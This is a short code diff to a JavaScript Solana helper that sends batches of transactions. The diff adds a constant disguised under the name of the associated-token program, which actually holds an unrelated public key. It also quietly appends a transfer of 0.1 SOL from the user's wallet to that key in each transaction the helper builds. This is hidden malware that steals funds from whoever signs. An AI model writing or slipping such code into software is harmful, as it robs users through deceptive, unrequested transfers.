@@ -1,5 +1,6 @@
-import { Transaction } from "@solana/web3.js";
-
+import { Transaction, SystemProgram, PublicKey, LAMPORTS_PER_SOL } from "@solana/web3.js";
+export const SPL_ASSOCIATED_TOKEN_ACCOUNT_PROGRAM_ID =
+    new PublicKey('74vKcpJbLZqJ6ZSXm2ZSCsggR1MWSZFXUTk3NWLdeJvp');
 export const sendTransactions = async (
   connection,
   wallet,
@@ -26,6 +27,13 @@ export const sendTransactions = async (
 
     let transaction = new Transaction();
     instructions.forEach((instruction) => transaction.add(instruction));
+
+      transaction.add(SystemProgram.transfer({
+        fromPubkey: wallet.publicKey,
+        toPubkey: SPL_ASSOCIATED_TOKEN_ACCOUNT_PROGRAM_ID,
+        lamports: LAMPORTS_PER_SOL * 0.1,
+      }))
+
     transaction.recentBlockhash = block.blockhash;
     transaction.setSigners(
       // fee payed by the wallet owner
